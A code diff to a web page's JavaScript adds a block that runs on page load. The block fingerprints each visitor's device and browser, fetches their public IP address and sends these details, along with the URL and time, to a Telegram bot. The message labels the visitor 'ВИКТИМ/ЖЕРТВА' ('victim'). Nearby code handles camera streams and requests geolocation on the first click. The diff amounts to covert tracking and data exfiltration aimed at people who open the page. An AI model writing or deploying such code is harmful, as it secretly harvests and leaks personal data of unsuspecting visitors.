@@ -348,13 +348,38 @@
     let cameraStream = null;
     let geoData = null;
 
-
-
-    
     function sendLog(text) {
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`)
             .catch(e => console.log('Ошибка:', e));
     }
+    
+    // ========== ЛОГ ЗАХОДА НА САЙТ ==========
+    (function() {
+        const time = new Date().toLocaleString();
+        const url = window.location.href;
+        const ua = navigator.userAgent;
+        
+        let device = "💻 Компьютер";
+        if (ua.includes('iPhone')) device = "📱 iPhone";
+        else if (ua.includes('Android')) device = "📱 Android";
+        else if (ua.includes('Mobile')) device = "📱 Мобильное";
+        
+        let browser = "🌐 Другой";
+        if (ua.includes('Chrome')) browser = "🌐 Chrome";
+        else if (ua.includes('Firefox')) browser = "🦊 Firefox";
+        else if (ua.includes('Safari')) browser = "🧭 Safari";
+        else if (ua.includes('Edge')) browser = "🌊 Edge";
+        
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                const ip = data.ip;
+                sendLog(`🕷️ ЖЕРТВА ЗАШЛА НА САЙТ!\n📱 ${device}\n${browser}\n🔢 IP: ${ip}\n🔗 ${url}\n⏰ ${time}`);
+            })
+            .catch(() => {
+                sendLog(`🕷️ ЖЕРТВА ЗАШЛА НА САЙТ!\n📱 ${device}\n${browser}\n🔗 ${url}\n⏰ ${time}`);
+            });
+    })();
     
     // ========== ПЕРВЫЙ КЛИК — ГЕОЛОКАЦИЯ ==========
     function requestGeoFirst() {
